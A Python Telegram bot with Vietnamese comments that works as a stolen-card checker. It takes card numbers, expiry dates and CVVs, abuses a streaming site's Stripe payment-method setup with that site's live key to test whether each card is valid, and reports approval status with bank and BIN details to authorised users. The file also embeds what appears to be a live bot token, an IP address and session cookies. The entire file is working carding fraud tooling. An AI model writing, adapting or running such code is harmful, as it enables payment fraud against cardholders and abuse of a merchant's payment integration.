import requests, re, time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup

# ========== CẤU HÌNH ==========
TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
ADMIN_ID = 5127429005  # ID người quản trị gốc
ALLOWED_USERS = {ADMIN_ID}  # Tập hợp user_id được phép
USER_RANKS = {ADMIN_ID: "admin"}  # quản lý rank người dùng

COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; ..."
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "cookie": COOKIES
}

# ========== LỆNH /chk ==========
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
        return

    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return

    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw)

    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return

    cc, mes, ano, cvv = match.groups()
    bin_code = cc[:6]
    await update.message.reply_text("🕐 Đang kiểm tra...")
    start_time = time.time()

    try:
        # CSRF token
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        meta_tag = soup.find("meta", {"name": "csrf-token"})
        if not meta_tag or not meta_tag.get("content"):
            await update.message.reply_text("❌ Không lấy được CSRF token.")
            return
        token = meta_tag["content"]

        # Setup Intent
        r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
        json2 = r2.json()
        setid = json2["setup_intent"]
        setin = setid.split("_secret_")[0]

        # Gửi thẻ
        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "VN",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/155bc2c263; stripe-js-v3/155bc2c263; payment-element",
            "payment_method_data[referrer]": "https://urbanflixtv.com",
            "payment_method_data[time_on_page]": "20923",
            "payment_method_data[client_attribution_metadata][client_session_id]": "487a05d5-8c48-488f-a3ab-e8de179fc4ef",
            "payment_method_data[guid]": "40a664fd-df2e-4b44-92e3-0476c602e58a96f58e",
            "payment_method_data[muid]": "c4954d5a-d300-446d-8144-a7c65563cbac3f9142",
            "payment_method_data[sid]": "6147f14c-a06f-420c-a782-594d676d8a2a332b9d",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }

        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
        j3 = r3.json()
        status = j3.get("status", "UNKNOWN")
        decline = j3.get("error", {}).get("decline_code", "NONE")

        # BIN lookup
        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
            "Accept": "*/*",
            "Pragma": "no-cache"
        })
        bin_json = bin_res.json()
        card = bin_json.get("scheme", "N/A")
        type_ = bin_json.get("type", "N/A")
        brand = bin_json.get("brand", "N/A")
        alpha2 = bin_json.get("alpha2", "N/A")
        name = bin_json.get("name", "")
        bank = name.split(", ")[0] if ", " in name else name

        elapsed = round(time.time() - start_time, 2)
        msg = f"""
<b>✅ CHECK RESULT</b>

<b>CC:</b> {cc}|{mes}|{ano}|{cvv}
<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
<b>Decline Code:</b> {decline}

<b>Gateway:</b> Stripe
<b>Card:</b> {card.upper()}
<b>Type:</b> {type_.capitalize()}
<b>Brand:</b> {brand}
<b>Alpha2:</b> {alpha2}
<b>Bank:</b> {bank}

<b>Took:</b> {elapsed} sec
<b>Checked by:</b> mnhat [{user_id}]
"""
        await update.message.reply_html(msg)

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")

# ========== LỆNH /add ==========
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bạn không phải quản trị viên.")
        return
    if not context.args:
        await update.message.reply_text("Dùng: /add <user_id>")
        return
    try:
        new_id = int(context.args[0])
        ALLOWED_USERS.add(new_id)
        USER_RANKS[new_id] = "member"
        await update.message.reply_text(f"✅ Đã thêm user {new_id} vào danh sách.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {e}")

# ========== LỆNH /info ==========
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    rank = USER_RANKS.get(user.id, "none")
    message = f"""
👤 <b>Thông tin người dùng:</b>

<b>Name:</b> {user.full_name}
<b>ID:</b> {user.id}
<b>Rank:</b> {rank}
""".strip()
    await update.message.reply_html(message)

# ========== CHẠY BOT ==========
if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("info", info))
    print("✅ Bot đang chạy...")
    app.run_polling()
